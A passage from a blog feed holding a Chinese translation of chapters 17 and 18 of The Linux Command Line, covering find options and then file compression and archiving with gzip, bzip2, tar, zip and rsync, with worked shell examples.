<p>此命令列出了实验环境中的所有 100 个目录和 2,600 个文件（以及 timestamp 和实验环境本身，共 2,702 个），因为它们都不符合我们定义的“好权限”。有了我们对运算符和动作的了解，我们可以向这个命令添加动作，以便对实验环境中的文件和目录应用新的权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find playground \( -<span class="built_in">type</span> f -not -perm 0600 -<span class="built_in">exec</span></span><br><span class="line"><span class="built_in">chmod</span> 0600 <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span> \) -or \( -<span class="built_in">type</span> d -not -perm 0700 -<span class="built_in">exec</span> <span class="built_in">chmod</span></span><br><span class="line">0700 <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span> \)</span><br></pre></td></tr></table></figure>

<p>在日常基础上，我们可能会发现发出两个命令，一个针对目录，一个针对文件，比这个大型复合命令更容易，但了解我们可以这样做是很好的。重要的一点是要理解如何将运算符和动作一起使用来执行有用的任务。</p>
<h4 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h4><p>最后，我们有选项。选项用于控制 find 搜索的范围。它们可以在构建 find 表达式时与其他测试和动作一起包括在内。表 17-7 列出了最常用的 find 选项。</p>
<p><em>表 17-7:</em> <em>find 选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-depth</td>
<td>指导 find 在处理目录本身之前先处理目录的文件。当指定 -delete 动作时，此选项会自动应用。</td>
</tr>
<tr>
<td>-maxdepth <em>levels</em></td>
<td>设置 find 在执行测试和动作时下降到目录树中的最大层数。</td>
</tr>
<tr>
<td>-mindepth <em>levels</em></td>
<td>设置 find 在应用测试和动作之前下降到目录树中的最小层数。</td>
</tr>
<tr>
<td>-mount</td>
<td>指导 find 不遍历挂载在其他文件系统上的目录。</td>
</tr>
<tr>
<td>-noleaf</td>
<td>指导 find 不基于其正在搜索类 Unix 文件系统的假设来优化搜索。当扫描 DOS&#x2F;Windows 文件系统和 CD-ROM 时需要这样做。</td>
</tr>
</tbody></table>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>很容易看出 locate 与 find 的复杂程度相反。它们各有用途。花时间探索 find 的许多功能。它可以通过定期使用，提高您对 Linux 文件系统操作的理解。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li>locate、updatedb、find 和 xargs 程序都是 GNU 项目的 <em>findutils</em> 包的一部分。GNU 项目提供了一个网站，上面有广泛的在线文档，这些文档非常好，如果您在高安全环境中使用这些程序，应该阅读：<span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2ZpbmR1dGlscy8=">http://www.gnu.org/software/findutils/<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>归档与备份</title>
    <url>/2024/04/18-archiving-and-backup/</url>
    <content><![CDATA[<h2 id="18章-–-归档与备份"><a href="#18章-–-归档与备份" class="headerlink" title="18章 – 归档与备份"></a>18章 – 归档与备份</h2><p>计算机系统管理员的主要任务之一是保护系统数据的安全。实现这一目标的一种方法是及时备份系统文件。即使你不是系统管理员，制作副本以及在不同地点和设备之间移动大量文件集合通常也是非常有用的。</p>
<p>在本章中，我们将介绍几个常用于管理文件集合的常见程序。这些是文件压缩程序：</p>
<span id="more"></span>

<ul>
<li>gzip – 压缩或扩展文件</li>
<li>bzip2 – 一个块排序文件压缩器</li>
</ul>
<p>这些是归档程序：</p>
<ul>
<li>tar – 磁带归档工具</li>
<li>zip – 打包和压缩文件</li>
</ul>
<p>这是文件同步程序：</p>
<ul>
<li>rsync – 远程文件和目录同步</li>
</ul>
<h3 id="压缩文件"><a href="#压缩文件" class="headerlink" title="压缩文件"></a>压缩文件</h3><p>在计算的整个历史中，一直存在着如何将最多的数据存储在最小的可用空间中的挑战，无论这个空间是内存、存储设备还是网络带宽。我们今天理所当然的许多数据服务，如移动电话服务、高清电视或宽带互联网，都得益于有效的<em>数据压缩</em>技术。</p>
<p>数据压缩是从数据中去除<em>冗余</em>的过程。让我们考虑一个假设的例子。假设我们有一个100像素乘以100像素的完全黑色的图片文件。在数据存储方面（假设每像素24位，或3字节），这张图片将占用30,000字节的存储空间。</p>
<p>100 * 100 * 3 &#x3D; 30,000</p>
<p>一个完全是一种颜色的图像包含完全冗余的数据。如果我们足够聪明，我们可以以这样的方式编码数据：仅仅描述我们有一个10,000个黑色像素的块。所以，与其存储包含30,000个零（黑色在图像文件中通常表示为零）的数据块，我们可以将数据压缩为数字10,000，后跟一个零来表示我们的数据。这种数据压缩方案称为<em>游程长度编码</em>，是最基本的压缩技术之一。今天的技术更加先进和复杂，但基本目标仍然相同——去除冗余数据。</p>
<p><em>压缩算法</em>（用于执行压缩的数学技术）分为两个大类。</p>
<ul>
<li><em>无损</em>：无损压缩保留了原始文件中包含的所有数据。这意味着当一个文件从压缩版本恢复时，恢复的文件与原始的未压缩版本完全相同。</li>
<li><em>有损</em>：另一方面，有损压缩在执行压缩时移除数据，以便应用更多的压缩。当一个有损文件恢复时，它并不与原始版本相匹配；相反，它是一个接近的近似。有损压缩的例子包括 JPEG（用于图像）和 MP3（用于音乐）。</li>
</ul>
<p>在我们的讨论中，我们将专门讨论无损压缩，因为大多数计算机上的数据不能容忍任何数据丢失。</p>
<h4 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h4><p>gzip 程序用于压缩一个或多个文件。执行时，它会用原始文件的压缩版本替换原始文件。相应的 gunzip 程序用于将压缩文件恢复到它们原始的未压缩形式。这里有一个例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l /etc &gt; foo.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l foo.*</span><br><span class="line">-rw-r--r-- 1 me me 15738 2018-10-14 07:15 foo.txt</span><br><span class="line">[me@linuxbox ~]$ gzip foo.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l foo.*</span><br><span class="line">-rw-r--r-- 1 me me 3230 2018-10-14 07:15 foo.txt.gz</span><br><span class="line">[me@linuxbox ~]$ gunzip foo.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l foo.*</span><br><span class="line">-rw-r--r-- 1 me me 15738 2018-10-14 07:15 foo.txt</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们从目录列表创建了一个名为 foo.txt 的文本文件。接下来，我们运行 gzip，它用一个名为 foo.txt.gz 的压缩版本替换了原始文件。在 foo.* 的目录列表中，我们看到原始文件已被压缩版本替换，且压缩版本的大小大约是原始文件的五分之一。我们还可以看到，压缩文件与原始文件具有相同的权限和时间戳。</p>
<p>接下来，我们运行 gunzip 程序以解压文件。之后，我们可以看到压缩版本的文件已被原始文件替换，同时保留了权限和时间戳。</p>
<p>gzip 有许多选项，如表 18-1 所描述。</p>
<p><em>表 18-1:</em> <em>gzip 选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>长选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-c</td>
<td>–stdout–to-stdout</td>
<td>将输出写入标准输出，并保留原始文件。</td>
</tr>
<tr>
<td>-d</td>
<td>–decompress–uncompress</td>
<td>解压。这会使 gzip 表现得像 gunzip。</td>
</tr>
<tr>
<td>-f</td>
<td>–force</td>
<td>即使原始文件的压缩版本已存在，也强制进行压缩。</td>
</tr>
<tr>
<td>-h</td>
<td>–help</td>
<td>显示使用信息。</td>
</tr>
<tr>
<td>-l</td>
<td>–list</td>
<td>列出每个压缩文件的压缩统计信息。</td>
</tr>
<tr>
<td>-r</td>
<td>–recursive</td>
<td>如果命令行上的一个或多个参数是目录，则递归压缩其中包含的文件。</td>
</tr>
<tr>
<td>-t</td>
<td>–test</td>
<td>测试压缩文件的完整性。</td>
</tr>
<tr>
<td>-v</td>
<td>–verbose</td>
<td>在压缩时显示详细信息。</td>
</tr>
<tr>
<td>-<em>number</em></td>
<td></td>
<td>设置压缩量。<em>number</em> 是范围在 1（最快，压缩最少）到 9（最慢，压缩最多）的整数。1 和 9 的值也可以分别表示为 –fast 和 –best。默认值是 6。</td>
</tr>
</tbody></table>
<p>让我们回到我们之前的例子。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ gzip foo.txt</span><br><span class="line">[me@linuxbox ~]$ gzip -tv foo.txt.gz</span><br><span class="line">foo.txt.gz: OK</span><br><span class="line">[me@linuxbox ~]$ gzip -d foo.txt.gz</span><br></pre></td></tr></table></figure>

<p>这里，我们用名为 foo.txt.gz 的压缩版本替换了 foo.txt 文件。接下来，我们使用 -t 和 -v 选项测试了压缩版本的完整性。最后，我们将文件解压到其原始形式。</p>
<p>gzip 还可以通过标准输入和输出以有趣的方式使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l /etc | gzip &gt; foo.txt.gz</span><br></pre></td></tr></table></figure>

<p>这个命令创建了目录列表的压缩版本。</p>
<p>gunzip 程序，用于解压 gzip 文件，假定文件名以 .gz 扩展名结束，所以只要指</p>
<p>定的名称不与现有的未压缩文件冲突，就不必指定它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ gunzip foo.txt</span><br></pre></td></tr></table></figure>

<p>如果我们的目标仅仅是查看压缩文本文件的内容，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ gunzip -c foo.txt | less</span><br></pre></td></tr></table></figure>

<p>或者，gzip 附带了一个叫做 zcat 的程序，等同于带有 -c 选项的 gunzip。它可以像 cat 命令一样用于 gzip 压缩的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ zcat foo.txt.gz | less</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong> 也有一个 zless 程序。它执行与上一个管道相同的功能。</p>
<h4 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h4><p>bzip2 程序由 Julian Seward 开发，与 gzip 类似，但使用了不同的压缩算法，以牺牲压缩速度为代价实现更高水平的压缩。在大多数方面，它的工作方式与 gzip 相同。用 bzip2 压缩的文件以 .bz2 为扩展名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l /etc &gt; foo.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l foo.txt</span><br><span class="line">-rw-r--r-- 1 me me 15738 2018-10-17 13:51 foo.txt</span><br><span class="line">[me@linuxbox ~]$ bzip2 foo.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l foo.txt.bz2</span><br><span class="line">-rw-r--r-- 1 me me 2792 2018-10-17 13:51 foo.txt.bz2</span><br><span class="line">[me@linuxbox ~]$ bunzip2 foo.txt.bz2</span><br></pre></td></tr></table></figure>

<p>正如我们所见，bzip2 可以像 gzip 那样使用。所有我们之前为 gzip 讨论过的选项（除了 r）也适用于 bzip2。但请注意，压缩级别选项 (-<em>number</em>) 对 bzip2 来说有些不同的含义。bzip2 附带了 bunzip2 和 bzcat 来解压文件。</p>
<p>bzip2 还配备了 bzip2recover 程序，用于尝试恢复受损的 .bz2 文件。</p>
<h3 id="不要过度压缩"><a href="#不要过度压缩" class="headerlink" title="不要过度压缩"></a>不要过度压缩</h3><p>我偶尔会看到人们尝试对已经用有效的压缩算法压缩过的文件进行压缩，比如这样：</p>
<h4 id="gzip-picture-jpg"><a href="#gzip-picture-jpg" class="headerlink" title="$ gzip picture.jpg"></a>$ <strong>gzip picture.jpg</strong></h4><p>别这么做。你可能只是在浪费时间和空间！如果对已经压缩的文件再次应用压缩，通常会得到一个更大的文件。这是因为所有压缩技术都涉及到一些开销，这些开销会被添加到文件中以描述压缩。如果你尝试压缩一个已经不包含冗余信息的文件，那么压缩最常见的结果不会有任何节省来抵消额外的开销。</p>
<h3 id="归档文件"><a href="#归档文件" class="headerlink" title="归档文件"></a>归档文件</h3><p>与压缩结合使用的一个常见文件管理任务是<em>归档</em>。归档是将许多文件收集起来并将它们捆绑成一个大文件的过程。归档经常作为系统备份的一部分。当旧数据从系统移动到某种类型的长期存储时，也会使用归档。</p>
<h4 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h4><p>在类 Unix 的软件世界中，tar 程序是归档文件的经典工具。它的名称，源于<em>tape archive</em>（磁带归档），揭示了它作为备份磁带工具的根源。虽然它仍然用于传统任务，但在其他存储设备上同样擅长。我们经常看到以 .tar 或 .tgz 为扩展名的文件名，分别表示“普通”tar 归档和 gzipped 归档。tar 归档可以由一组独立文件、一个或多个目录层次结构，或二者的混合体组成。命令语法如下：</p>
<p><em><em>tar <strong><em><strong>mode</strong></em>[</strong></em>options</em>**] <em><strong>pathname</strong></em>…</p>
<p>这里的 <em>mode</em> 是下表 18-2 中列出的以下操作模式之一（这里只显示了部分列表；完整列表请参见 tar 手册页）。</p>
<p><em>表 18-2:</em> <em>tar 模式</em></p>
<table>
<thead>
<tr>
<th><strong>模式</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>从文件和&#x2F;或目录列表中创建归档。</td>
</tr>
<tr>
<td>x</td>
<td>提取归档。</td>
</tr>
<tr>
<td>r</td>
<td>将指定路径名追加到归档的末尾。</td>
</tr>
<tr>
<td>t</td>
<td>列出归档的内容。</td>
</tr>
</tbody></table>
<p>tar 在表达选项方面有些奇特，因此我们需要一些示例来展示它的工作方式。首先，让我们重新创建上一章中的实验环境。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mkdir</span> -p playground/dir-&#123;001..100&#125;</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">touch</span> playground/dir-&#123;001..100&#125;/file-&#123;A..Z&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，让我们创建整个实验环境的 tar 归档。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ tar cf playground.tar playground</span><br></pre></td></tr></table></figure>

<p>这个命令创建了一个名为 playground.tar 的 tar 归档，包含了整个实验环境目录层次结构。我们可以看到，模式和 f 选项，用于指定 tar 归档的名称，可以合并在一起，且不需要前导破折号。但请注意，模式必须始终首先指定，然后才是其他选项。</p>
<p>要列出归档的内容，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ tar tf playground.tar</span><br></pre></td></tr></table></figure>

<p>为了更详细的列表，我们可以添加 v（详细）选项。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ tar tvf playground.tar</span><br></pre></td></tr></table></figure>

<p>现在，让我们在新位置提取实验环境。我们将通过创建一个名为 foo 的新目录，更改目录并提取 tar 归档来实现这一点。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mkdir</span> foo</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">cd</span> foo</span><br><span class="line">[me@linuxbox foo]$ tar xf ../playground.tar</span><br><span class="line">[me@linuxbox foo]$ <span class="built_in">ls</span></span><br><span class="line">playground</span><br></pre></td></tr></table></figure>

<p>如果我们检查 ~&#x2F;foo&#x2F;playground 的内容，我们会看到归档成功安装，精确地复制了原始文件。不过，有一个注意事项。除非我们作为超级用户操作，否则从归档中提取的文件和目录将采用执行恢复操作的用户的所有权，而不是原始所有者。</p>
<p>tar 在归档中处理路径名的方式也很有趣。路径名的默认值是相对的，而不是绝对的。tar 通过在创建归档时简单地从路径名中删除任何前导斜杠来实现这一点。为了演示，我们将重新创建我们的归档，这次指定绝对路径名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox foo]$ <span class="built_in">cd</span></span><br><span class="line">[me@linuxbox ~]$ tar cf playground2.tar ~/playground</span><br></pre></td></tr></table></figure>

<p>记住，~&#x2F;playground 将在我们按下 Enter 键时展开为 &#x2F;home&#x2F;me&#x2F;playground，因此我们将获得一个绝对路径名进行演示。接下来，我们像之前一样提取归档，并观察会发生什么。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cd</span> foo</span><br><span class="line">[me@linuxbox foo]$ tar xf ../playground2.tar</span><br><span class="line">[me@linuxbox foo]$ <span class="built_in">ls</span></span><br><span class="line">home playground</span><br><span class="line">[me@linuxbox foo]$ <span class="built_in">ls</span> home</span><br><span class="line">me</span><br><span class="line">[me@linuxbox foo]$ <span class="built_in">ls</span> home/me</span><br><span class="line">playground</span><br></pre></td></tr></table></figure>

<p>在这里，我们可以看到当我们提取了第二个归档时，它相对于我们当前的工作目录 ~&#x2F;foo 而不是根目录重新创建了 home&#x2F;me&#x2F;playground 目录，就像绝对路径名的情况那样。这可能看起来像一种奇怪的工作方式，但实际上这种方式更有用，因为它允许我们将归档提取到任何位置，而不是被迫提取到它们的原始位置。重复这个练习并包含详细选项 (v) 将更清楚地展示正在发生的事情。</p>
<p>让我们考虑一个假设性但实际的 tar 使用示例。假设我们想从一个系统复制 home 目录及其内容到另一个系统，并且我们有一个大的 USB 硬盘可以用于传输。在我们的现代 Linux 系统中，硬盘在 &#x2F;media 目录下“自动”挂载。假设我们连接它时，硬盘的卷标名称为 BigDisk。要制作 tar 归档，我们可以执行以下操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo tar cf /media/BigDisk/home.tar /home</span><br></pre></td></tr></table></figure>

<p>在 tar 文件写入后，我们卸载硬盘并将其连接到第二台计算机。再次，它被挂载在 &#x2F;media&#x2F;BigDisk。要提取归档，我们这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox2 ~]$ <span class="built_in">cd</span> /</span><br><span class="line">[me@linuxbox2 /]$ sudo tar xf /media/BigDisk/home.tar</span><br></pre></td></tr></table></figure>

<p>重要的是要看到我们必须首先改变目录到 &#x2F;，这样提取操作就是相对于根目录，因为归档中的所有路径名都是相对的。</p>
<p>在提取归档时，可以限制从归档中提取的内容。例如，如果我们想从归档中提取单个文件，可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar xf archive.tar pathname</span><br></pre></td></tr></table></figure>

<p>通过在命令后添加尾随的 <em>pathname</em>，tar 将仅还原指定的文件。</p>
<p>可以指定多个路径名。注意，路径名必须是归档中存储的完整、精确的相对路径名。在指定路径名时，通常不支持通配符；然而，GNU 版本的 tar（通常在 Linux 发行版中找到的版本）支持 –wildcards 选项。这是一个使用我们之前的 playground.tar 文件的示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cd</span> foo</span><br><span class="line">[me@linuxbox foo]$ tar xf ../playground2.tar --wildcards <span class="string">&#x27;home/me/playground/dir-*/file-A&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个命令将只提取与指定路径名匹配的文件，包括通配符 dir-*。</p>
<p>tar 经常与 find 一起使用来生成归档。在这个示例中，我们将使用 find 来生成一个要包含在归档中的文件集。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find playground -name <span class="string">&#x27;file-A&#x27;</span> -<span class="built_in">exec</span> tar rf playground.tar <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;+&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里我们使用 find 匹配 playground 中名为 file-A 的所有文件，然后使用 -exec 动作调用 tar 在追加模式 (r) 中将匹配的文件添加到 playground.tar 归档中。</p>
<p>使用 tar 与 find 是创建目录树或整个系统的<em>增量备份</em>的好方法。通过使用 find 匹配比时间戳文件更新的文件，我们可以创建一个仅包含比上次归档更新的文件的归档，假设每次创建归档后都会更新时间戳文件。</p>
<p>tar 还可以利用标准输入和输出。这是一个综合示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox foo]$ <span class="built_in">cd</span></span><br><span class="line">[me@linuxbox ~]$ find playground -name <span class="string">&#x27;file-A&#x27;</span> | tar cf - --filesfrom=- | gzip &gt; playground.tgz</span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们使用 find 程序生成匹配文件的列表，并将它们管道传输到 tar 中。如果指定了文件名 -，它表示根据需要的标准输入或输出。（顺便说一句，许多其他程序也使用 - 来表示标准输入&#x2F;输出。）–files-from 选项（也可以指定为 -T）使 tar 从文件而不是命令行读取其路径名列表。最后，由 tar 生成的归档被管道传输到 gzip 中，以创建压缩的归档 playground.tgz。.tgz 扩展名是给 gzip 压缩的 tar 文件的传统扩展名。有时也使用 .tar.gz 扩展名。</p>
<p>虽然我们使用外部的 gzip 程序生成我们的压缩归档，但现代版本的 GNU tar 直接支持 gzip 和 bzip2 压缩，分别使用 z 和 j 选项。使用我们之前的示例作为基础，我们可以简化它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find playground -name <span class="string">&#x27;file-A&#x27;</span> | tar czf playground.tgz -T -</span><br></pre></td></tr></table></figure>

<p>如果我们想创建一个 bzip2 压缩的归档，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ find playground -name <span class="string">&#x27;file-A&#x27;</span> | tar cjf playground.tbz -T -</span><br></pre></td></tr></table></figure>

<p>通过简单地将压缩选项从 z 更改为 j（并将输出文件的扩展名更改为 .tbz 以表示 bzip2 压缩的文件），我们启用了 bzip2 压缩。</p>
<p>使用 tar 命令的标准输入和输出的另一个有趣用途涉及通过网络在系统之间传输文件。想象一下，我们有两台运行类 Unix 系统的机器，配备了 tar 和 ssh。在这种情况下，我们可以将一个目录从远程系统（在这个示例中命名为 remote-sys）传输到我们的本地系统。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mkdir</span> remote-stuff</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">cd</span> remote-stuff</span><br><span class="line">[me@linuxbox remote-stuff]$ ssh remote-sys <span class="string">&#x27;tar cf - Documents&#x27;</span> | tar xf -</span><br><span class="line">me@remote-sys’s password:</span><br><span class="line">[me@linuxbox remote-stuff]$ <span class="built_in">ls</span></span><br><span class="line">Documents</span><br></pre></td></tr></table></figure>

<p>在这里，我们能够从远程系统 remote-sys 复制名为 Documents 的目录到本地系统上名为 remote-stuff 的目录中。我们是如何做到的？首先，我们使用 ssh 在远程系统上启动了 tar 程序。你会记得 ssh 允许我们在联网的计算机上远程执行程序，并在本地系统上“看到”结果——在远程系统上产生的标准输出被发送到本地系统进行查看。我们可以利用这一点，让 tar 创建一个归档（c 模式）并将其发送到标准输出，而不是文件（带有破折号参数的 f 选项），从而通过 ssh 提供的加密隧道将归档传输到本地系统。在本地系统上，我们执行 tar 并让它从标准输入（再次是带有破折号参数的 f 选项）展开归档。</p>
<h4 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h4><p>zip 程序既是压缩工具，也是归档工具。该程序使用的文件格式对 Windows 用户来说很熟悉，因为它读写 .zip 文件。然而，在 Linux 中，gzip 是主要的压缩程序，bzip2 紧随其后。</p>
<p>在最基本的用法中，zip 被这样调用：</p>
<p>**zip **<em><strong>options</strong></em> zipfile file…</p>
<p>例如，要制作我们实验环境的 zip 归档，我们会这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ zip -r playground.zip playground</span><br></pre></td></tr></table></figure>

<p>除非我们包含 -r 选项进行递归，否则只有 playground 目录（但其内容不包括在内）会被存储。尽管 .zip 扩展名是自动添加的，但为了清晰起见，我们会包含文件扩展名。</p>
<p>在创建 zip 归档时，zip 通常会显示如下一系列消息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adding: playground/dir-020/file-Z (stored 0%)</span><br><span class="line">adding: playground/dir-020/file-Y (stored 0%)</span><br><span class="line">adding: playground/dir-020/file-X (stored 0%)</span><br><span class="line">adding: playground/dir-087/ (stored 0%)</span><br><span class="line">adding: playground/dir-087/file-S (stored 0%) </span><br></pre></td></tr></table></figure>

<p>这些消息显示了添加到归档中的每个文件的状态。zip 将使用两种存储方法之一将文件添加到归档中：要么“存储”文件而不进行压缩，正如这里所示，要么“压缩”文件以进行压缩。显示在存储方法后的数字值表示实现的压缩量。由于我们的实验环境只包含空文件，因此其内容没有进行压缩。</p>
<p>使用 unzip 程序提取 zip 文件的内容非常简单。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cd</span> foo</span><br><span class="line">[me@linuxbox foo]$ unzip ../playground.zip</span><br></pre></td></tr></table></figure>

<p>关于 zip（与 tar 相反）的一点需要注意的是，如果指定了现有的归档，则它会被更新而不是替换。这意味着现有归档被保留，但新文件被添加，匹配的文件被替换。</p>
<p>可以通过指定文件来从 zip 归档中选择性地列出和提取文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ unzip -l playground.zip playground/dir-087/file-Z</span><br><span class="line">Archive: ../playground.zip</span><br><span class="line"> Length Date Time Name</span><br><span class="line"> -------- ---- ---- ----</span><br><span class="line"> 0 10-05-16 09:25 playground/dir-087/file-Z</span><br><span class="line"> -------- -------</span><br><span class="line"> 0 1 file</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">cd</span> foo</span><br><span class="line">[me@linuxbox foo]$ unzip ../playground.zip playground/dir-087/file-Z</span><br><span class="line">Archive: ../playground.zip</span><br><span class="line">replace playground/dir-087/file-Z? [y]es, [n]o, [A]ll, [N]one,</span><br><span class="line">[r]ename: y</span><br><span class="line"> extracting: playground/dir-087/file-Z </span><br></pre></td></tr></table></figure>

<p>使用 -l 选项会使 unzip 仅列出归档的内容而不提取文件。如果没有指定文件，unzip 将列出归档中的所有文件。可以添加 -v 选项以增加列表的详细程度。请注意，当归档提取与现有文件冲突时，用户会在文件被替换前收到提示。</p>
<p>与 tar 一样，zip 也可以使用标准输入和输出，尽管它的实现有些不太实用。可以通过 -@ 选项将文件名列表通过管道发送给 zip。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox foo]$ <span class="built_in">cd</span></span><br><span class="line">[me@linuxbox ~]$ find playground -name <span class="string">&quot;file-A&quot;</span> | zip -@ file-A.zip</span><br></pre></td></tr></table></figure>

<p>这里我们使用 find 生成符合测试条件 -name “file-A” 的文件列表，然后将列表通过管道传输给 zip，zip 创建了包含选定文件的归档 file-A.zip。</p>
<p>zip 也支持将其输出写入标准输出，但由于很少有程序可以使用该输出，因此使用受限。不</p>
<p>幸的是，unzip 程序不接受标准输入。这阻止了 zip 和 unzip 被一起用来像 tar 那样执行网络文件复制。</p>
<p>然而，zip 可以接受标准输入，因此可以用来压缩其他程序的输出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l /etc/ | zip ls-etc.zip -</span><br><span class="line"> adding: - (deflated 80%)</span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们将 ls 的输出通过管道传输给 zip。与 tar 一样，zip 将尾随的破折号解释为“使用标准输入作为输入文件”。</p>
<p>unzip 程序允许在指定了 -p（表示管道）选项时将其输出发送到标准输出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ unzip -p ls-etc.zip | less</span><br></pre></td></tr></table></figure>

<p>我们简要介绍了 zip&#x2F;unzip 能做的一些基本事情。它们都有很多选项增加了它们的灵活性，尽管有些选项是特定于其他系统的平台。zip 和 unzip 的手册页都相当好，包含有用的示例。然而，这些程序的主要用途是用于与 Windows 系统交换文件，而不是在 Linux 上执行压缩和归档，在 Linux 中，tar 和 gzip 更受欢迎。</p>
<h3 id="同步文件和目录"><a href="#同步文件和目录" class="headerlink" title="同步文件和目录"></a>同步文件和目录</h3><p>维护系统备份副本的一个常见策略涉及将一个或多个目录与位于本地系统（通常是某种可移动存储设备）或远程系统上的另一个目录（或多个目录）保持同步。例如，我们可能有一个正在开发的网站的本地副本，并不时将其与远程 Web 服务器上的“实时”副本同步。</p>
<p>在类 Unix 的世界中，执行此任务的首选工具是 rsync。该程序可以通过使用 <em>rsync 远程更新协议</em> 同步本地和远程目录，使 rsync 能够快速检测出两个目录之间的差异，并执行将它们同步所需的最小量复制。这使得 rsync 使用起来非常快速且经济，与其他类型的复制程序相比。rsync 的调用方式如下：</p>
<p>**rsync <em><strong>options</strong></em> <em><strong>source</strong></em> **<em><strong>destination</strong></em></p>
<p>其中 <em>source</em> 和 <em>destination</em> 可以是以下之一：</p>
<ul>
<li>本地文件或目录</li>
<li>以 <em>[user@]host:path</em> 形式的远程文件或目录</li>
<li>使用 URI <em>rsync:&#x2F;&#x2F;[user@]host[:port]&#x2F;path</em> 指定的远程 rsync 服务器</li>
</ul>
<p>请注意，源或目的地必须是本地文件。不支持远程到远程的复制。</p>
<p>让我们在一些本地文件上试试 rsync。首先，让我们清理一下我们的 foo 目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">rm</span> -rf foo/*</span><br></pre></td></tr></table></figure>

